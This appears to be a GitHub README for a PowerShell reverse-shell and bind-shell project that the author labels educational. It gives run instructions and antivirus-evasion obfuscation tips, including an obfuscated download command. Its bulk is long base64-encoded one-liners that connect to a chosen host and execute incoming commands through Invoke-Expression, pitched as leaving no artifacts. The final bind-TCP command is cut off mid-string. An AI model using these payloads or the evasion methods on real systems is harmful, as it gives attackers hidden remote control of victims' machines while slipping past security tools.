# PowerShell Reverse TCP

PowerShell scripts for communicating with a remote host.

Remote host will have full control over client's PowerShell and all its underlying commands.

Tested with PowerShell v5.1.18362.1110 on Windows 10 Enterprise OS (64-bit).

Made for educational purposes. I hope it will help!

## How to Run

**Change the IP address and port number inside the scripts as necessary.**

Open the PowerShell from [\\src\\](https://github.com/ivan-sincek/powershell-reverse-tcp/tree/master/src) and run the commands shown below.

Set the execution policy:

```pwsh
Set-ExecutionPolicy Unrestricted
```

Run the script:

```pwsh
.\powershell_reverse_tcp.ps1
```

Or run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -File .\powershell_reverse_tcp.ps1
```

## PowerShell Obfuscation

Try to bypass an antivirus or some other security mechanisms by obfuscating your scripts.

You can see such obfuscation in the example below.

Original PowerShell command:

```pwsh
(New-Object Net.WebClient).DownloadFile($url, $out)
```

Obfuscated PowerShell command:

```pwsh
& (`G`C`M *ke-E*) '(& (`G`C`M *ew-O*) `N`E`T`.`W`E`B`C`L`I`E`N`T)."`D`O`W`N`L`O`A`D`F`I`L`E"($url, $out)'
```

**Check the original PowerShell script [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/powershell_reverse_tcp.ps1) and the obfuscated one [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/powershell_reverse_tcp_obfuscated.ps1).**

Besides [manual obfuscation](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/powershell_reverse_tcp_manual.ps1), the original PowerShell script was also obfuscated with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). Credits to the author!

Search the Internet for additional obfuscation techniques and methods.

P.S. As the PowerShell is constantly being updated some regular expressions (e.g. `*ke-E*`) might start to throw errors due to multiple methods matching the same expression, so the expressions will need to be specified a little bit better.

## PowerShell Encoded Command

Use the one-liners below if you don't want to leave any artifacts behind.

**\[Reverse TCP\]** To run the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABhAGQAZAByACAAPQAgACQAKABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAiAEUAbgB0AGUAcgAgAGEAZABkAHIAZQBzAHMAIgApAC4AVAByAGkAbQAoACkAOwANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgA7AA0ACgAkAHAAbwByAHQAIAA9ACAAJAAoAFIAZQBhAGQALQBIAG8AcwB0ACAALQBQAHIAbwBtAHAAdAAgACIARQBuAHQAZQByACAAcABvAHIAdAAgAG4AdQBtAGIAZQByACIAKQAuAFQAcgBpAG0AKAApADsADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoAaQBmACAAKAAkAGEAZABkAHIALgBMAGUAbgBnAHQAaAAgAC0AbAB0ACAAMQAgAC0AbwByACAAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBvAHQAaAAgAHAAYQByAGEAbQBlAHQAZQByAHMAIABhAHIAZQAgAHIAZQBxAHUAaQByAGUAZAAiADsADQAKAH0AIABlAGwAcwBlACAAewANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABvAHcAZQByAFMAaABlAGwAbAAgAFIAZQB2AGUAcgBzAGUAIABUAEMAUAAgAHYAMQAuADEAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAeQAgAEkAdgBhAG4AIABTAGkAbgBjAGUAawAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIABHAGkAdABIAHUAYgAgAHIAZQBwAG8AcwBpAHQAbwByAHkAIABhAHQAIABnAGkAdABoAHUAYgAuAGMAbwBtAC8AaQB2AGEAbgAtAHMAaQBuAGMAZQBrAC8AcABvAHcAZQByAHMAaABlAGwAbAAtAHIAZQB2AGUAcgBzAGUALQB0AGMAcAAuACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARgBlAGUAbAAgAGYAcgBlAGUAIAB0AG8AIABkAG8AbgBhAHQAZQAgAGIAaQB0AGMAbwBpAG4AIABhAHQAIAAxAEIAcgBaAE0ANgBUADcARwA5AFIATgA4AHYAYgBhAGIAbgBmAFgAdQA0AE0ANgBMAHAAZwB6AHQAcQA2AFkAMQA0AC4AIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACIAOwANAAoACQAkAGMAbABpAGUAbgB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABiAHUAZgBmAGUAcgAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAHcAcgBpAHQAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAZABhAHQAYQAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAHIAZQBzAHUAbAB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJAHQAcgB5ACAAewANAAoACQAJACMAIABjAGgAYQBuAGcAZQAgAHQAaABlACAAaABvAHMAdAAgAGEAZABkAHIAZQBzAHMAIABhAG4AZAAvAG8AcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAgAGEAcwAgAG4AZQBjAGUAcwBzAGEAcgB5AA0ACgAJAAkAJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAkAGEAZABkAHIALAAgACQAcABvAHIAdAApADsADQAKAAkACQAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwANAAoACQAJACQAYgB1AGYAZgBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMQAwADIANAA7AA0ACgAJAAkAJABlAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBBAHMAYwBpAGkARQBuAGMAbwBkAGkAbgBnADsADQAKAAkACQAkAHcAcgBpAHQAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAcwB0AHIAZQBhAG0AKQA7AA0ACgAJAAkAJAB3AHIAaQB0AGUAcgAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgACQAdAByAHUAZQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuACIAOwANAAoACQAJACQAYgB5AHQAZQBzACAAPQAgADAAOwANAAoACQAJAGQAbwAgAHsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUAKAAiAFAAUwA+ACIAKQA7AA0ACgAJAAkACQBkAG8AIAB7AA0ACgAJAAkACQAJACQAYgB5AHQAZQBzACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACkAOwANAAoACQAJAAkACQBpAGYAIAAoACQAYgB5AHQAZQBzACAALQBnAHQAIAAwACkAIAB7AA0ACgAJAAkACQAJAAkAJABkAGEAdABhACAAPQAgACQAZABhAHQAYQAgACsAIAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHkAdABlAHMAKQA7AA0ACgAJAAkACQAJAH0ADQAKAAkACQAJAH0AIAB3AGgAaQBsAGUAIAAoACQAcwB0AHIAZQBhAG0ALgBEAGEAdABhAEEAdgBhAGkAbABhAGIAbABlACkAOwANAAoACQAJAAkAaQBmACAAKAAkAGQAYQB0AGEALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApACAAewANAAoACQAJAAkACQB0AHIAeQAgAHsADQAKAAkACQAJAAkACQAkAHIAZQBzAHUAbAB0ACAAPQAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwA7AA0ACgAJAAkACQAJAH0AIABjAGEAdABjAGgAIAB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwB1AGwAdAAgAD0AIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQAJAAkACQB9AA0ACgAJAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUATABpAG4AZQAoACQAcgBlAHMAdQBsAHQAKQA7AA0ACgAJAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQAJAH0ADQAKAAkACQB9ACAAdwBoAGkAbABlACAAKAAkAGIAeQB0AGUAcwAgAC0AZwB0ACAAMAApADsADQAKAAkAfQAgAGMAYQB0AGMAaAAgAHsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKAAkAfQAgAGYAaQBuAGEAbABsAHkAIAB7AA0ACgAJAAkAaQBmACAAKAAkAHcAcgBpAHQAZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABzAHQAcgBlAGEAbQAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHMAdAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHMAdAByAGUAYQBtAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAYwBsAGkAZQBuAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJABjAGwAaQBlAG4AdAAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGIAdQBmAGYAZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAYgB1AGYAZgBlAHIALgBDAGwAZQBhAHIAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGQAYQB0AGEAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkAGEAdABhACIAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcgBlAHMAdQBsAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgByAGUAcwB1AGwAdAAiADsADQAKAAkACQB9AA0ACgAJAH0ADQAKAH0ADQAKAA==
```

Encoded script will prompt for input. See the slightly altered script in my other [project](https://github.com/ivan-sincek/invoker/blob/master/ps/powershell_reverse_tcp.ps1).

**\[Reverse TCP - Parameterized\]** To pass parameters to PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -Command "'127.0.0.1', '9000'" | PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABhAGQAZAByACAAPQAgACQAKABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAiAEUAbgB0AGUAcgAgAGEAZABkAHIAZQBzAHMAIgApAC4AVAByAGkAbQAoACkAOwANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgA7AA0ACgAkAHAAbwByAHQAIAA9ACAAJAAoAFIAZQBhAGQALQBIAG8AcwB0ACAALQBQAHIAbwBtAHAAdAAgACIARQBuAHQAZQByACAAcABvAHIAdAAgAG4AdQBtAGIAZQByACIAKQAuAFQAcgBpAG0AKAApADsADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoAaQBmACAAKAAkAGEAZABkAHIALgBMAGUAbgBnAHQAaAAgAC0AbAB0ACAAMQAgAC0AbwByACAAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBvAHQAaAAgAHAAYQByAGEAbQBlAHQAZQByAHMAIABhAHIAZQAgAHIAZQBxAHUAaQByAGUAZAAiADsADQAKAH0AIABlAGwAcwBlACAAewANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABvAHcAZQByAFMAaABlAGwAbAAgAFIAZQB2AGUAcgBzAGUAIABUAEMAUAAgAHYAMQAuADEAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAeQAgAEkAdgBhAG4AIABTAGkAbgBjAGUAawAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIABHAGkAdABIAHUAYgAgAHIAZQBwAG8AcwBpAHQAbwByAHkAIABhAHQAIABnAGkAdABoAHUAYgAuAGMAbwBtAC8AaQB2AGEAbgAtAHMAaQBuAGMAZQBrAC8AcABvAHcAZQByAHMAaABlAGwAbAAtAHIAZQB2AGUAcgBzAGUALQB0AGMAcAAuACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARgBlAGUAbAAgAGYAcgBlAGUAIAB0AG8AIABkAG8AbgBhAHQAZQAgAGIAaQB0AGMAbwBpAG4AIABhAHQAIAAxAEIAcgBaAE0ANgBUADcARwA5AFIATgA4AHYAYgBhAGIAbgBmAFgAdQA0AE0ANgBMAHAAZwB6AHQAcQA2AFkAMQA0AC4AIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACIAOwANAAoACQAkAGMAbABpAGUAbgB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABiAHUAZgBmAGUAcgAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAHcAcgBpAHQAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAZABhAHQAYQAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAHIAZQBzAHUAbAB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJAHQAcgB5ACAAewANAAoACQAJACMAIABjAGgAYQBuAGcAZQAgAHQAaABlACAAaABvAHMAdAAgAGEAZABkAHIAZQBzAHMAIABhAG4AZAAvAG8AcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAgAGEAcwAgAG4AZQBjAGUAcwBzAGEAcgB5AA0ACgAJAAkAJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAkAGEAZABkAHIALAAgACQAcABvAHIAdAApADsADQAKAAkACQAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwANAAoACQAJACQAYgB1AGYAZgBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMQAwADIANAA7AA0ACgAJAAkAJABlAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBBAHMAYwBpAGkARQBuAGMAbwBkAGkAbgBnADsADQAKAAkACQAkAHcAcgBpAHQAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAcwB0AHIAZQBhAG0AKQA7AA0ACgAJAAkAJAB3AHIAaQB0AGUAcgAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgACQAdAByAHUAZQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuACIAOwANAAoACQAJACQAYgB5AHQAZQBzACAAPQAgADAAOwANAAoACQAJAGQAbwAgAHsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUAKAAiAFAAUwA+ACIAKQA7AA0ACgAJAAkACQBkAG8AIAB7AA0ACgAJAAkACQAJACQAYgB5AHQAZQBzACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACkAOwANAAoACQAJAAkACQBpAGYAIAAoACQAYgB5AHQAZQBzACAALQBnAHQAIAAwACkAIAB7AA0ACgAJAAkACQAJAAkAJABkAGEAdABhACAAPQAgACQAZABhAHQAYQAgACsAIAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHkAdABlAHMAKQA7AA0ACgAJAAkACQAJAH0ADQAKAAkACQAJAH0AIAB3AGgAaQBsAGUAIAAoACQAcwB0AHIAZQBhAG0ALgBEAGEAdABhAEEAdgBhAGkAbABhAGIAbABlACkAOwANAAoACQAJAAkAaQBmACAAKAAkAGQAYQB0AGEALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApACAAewANAAoACQAJAAkACQB0AHIAeQAgAHsADQAKAAkACQAJAAkACQAkAHIAZQBzAHUAbAB0ACAAPQAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwA7AA0ACgAJAAkACQAJAH0AIABjAGEAdABjAGgAIAB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwB1AGwAdAAgAD0AIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQAJAAkACQB9AA0ACgAJAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUATABpAG4AZQAoACQAcgBlAHMAdQBsAHQAKQA7AA0ACgAJAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQAJAH0ADQAKAAkACQB9ACAAdwBoAGkAbABlACAAKAAkAGIAeQB0AGUAcwAgAC0AZwB0ACAAMAApADsADQAKAAkAfQAgAGMAYQB0AGMAaAAgAHsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKAAkAfQAgAGYAaQBuAGEAbABsAHkAIAB7AA0ACgAJAAkAaQBmACAAKAAkAHcAcgBpAHQAZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABzAHQAcgBlAGEAbQAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHMAdAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHMAdAByAGUAYQBtAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAYwBsAGkAZQBuAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJABjAGwAaQBlAG4AdAAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGIAdQBmAGYAZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAYgB1AGYAZgBlAHIALgBDAGwAZQBhAHIAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGQAYQB0AGEAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkAGEAdABhACIAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcgBlAHMAdQBsAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgByAGUAcwB1AGwAdAAiADsADQAKAAkACQB9AA0ACgAJAH0ADQAKAH0ADQAKAA==
```

**\[Bind TCP\]** To run the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABwAG8AcgB0ACAAPQAgACQAKABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAiAEUAbgB0AGUAcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAiACkALgBUAHIAaQBtACgAKQA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAGkAZgAgACgAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAUABvAHIAdAAgAG4AdQBtAGIAZQByACAAaQBzACAAcgBlAHEAdQBpAHIAZQBkACIAOwANAAoAfQAgAGUAbABzAGUAIAB7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABvAHcAZQByAFMAaABlAGwAbAAgAEIAaQBuAGQAIABUAEMAUAAgAHYAMQAuADEAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACA